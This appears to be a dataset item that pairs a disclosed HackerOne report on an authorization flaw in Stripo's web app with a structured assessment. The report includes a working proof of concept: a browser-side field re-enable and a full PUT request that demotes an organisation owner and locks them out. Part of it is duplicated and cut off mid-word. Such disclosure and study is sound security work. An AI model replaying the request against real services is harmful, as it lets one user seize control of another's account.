# ACCESS_CONTROL — h1

- source: h1
- class: access_control
- cwe: CWE-285
- severity: high
- program: stripo
- quality_score: 13

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Improper Authorization
**Affected Asset:** my.stripo.email

**Vulnerability Description:**
hi there ,

i found an vulnerability on  https://my.stripo.email/cabinet/#/users/orog_id ,

generally every user have an organisation and the organisation contain projects , 

lets suppose : [REDACTED_EMAIL] is the owner of the project

and [REDACTED_EMAIL] was invited to his project as admin , in normal situation the owner can not be removed even if second account is admin

the issue is i can removed the owned from hi position to admin , and the big problem once the owner is removed he can not login again to his account


## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. you must have 2 account , one owner , the second got invited as admin

  2. log in with your second account and go to https://my.stripo.email/cabinet/#/users/xxxx

       you will see that the input of role is disabled , enable it via inspect element ( f12) , 

then change the role of owner for it to admin , an PUT request will be sent

##http request

PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1
Host: my.stripo.email
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer [REDACTED_TOKEN]
Content-Type: application/json;charset=UTF-8
Cache-Control: no-cache
Pragma: no-cache
Expires: Sat, 01 Jan 2000 00:00:00 GMT
Content-Length: 231
Origin: https://my.stripo.email
Connection: close
Referer: https://my.stripo.email/cabinet/
Cookie: [REDACTED_COOKIE]; __stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a; _ga=GA[REDACTED_PHONE]; _gid=GA[REDACTED_PHONE]; _fbp=fb.[REDACTED_PHONE]; token=[REDACTED_JWT]; intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4

{"repository":{},"idField":"id","entityType":"USER","id":135628,"role":"admin","organizationId":135428,"firstName":"TESt","lastName":"account","color":"#cc90e2","email":"[REDACTED_EMAIL]","projectIds":[],"suspended":false} 

##http response :


HTTP/1.1 200 
Server: nginx
Date: Wed, 04 Dec 2019 09:56:41 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Accept-Encoding
█████████
████
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 180

█████cc90e2","email":"[REDACTED_EMAIL]","projectIds":[],"suspended":false}

i hope it is clear , 

thanks

## Impact

an attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account

**Steps to Reproduce:**
[add details for how we can reproduce the issue]

  1. you must have 2 account , one owner , the second got invited as admin

  2. lo

## Analysis / Response

**Vulnerability Class:** access_control
**CWE:** CWE-285
**Weakness:** Improper Authorization
**Severity:** high
**Endpoint Pattern:** PUT /cabinet/stripeapi/v1/organizations/135428/users

**Impact Assessment:**
an attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account

**Remediation:**
Implement server-side authorization checks on every request. Use role-based access control. Deny by default. Never rely on client-side access control.
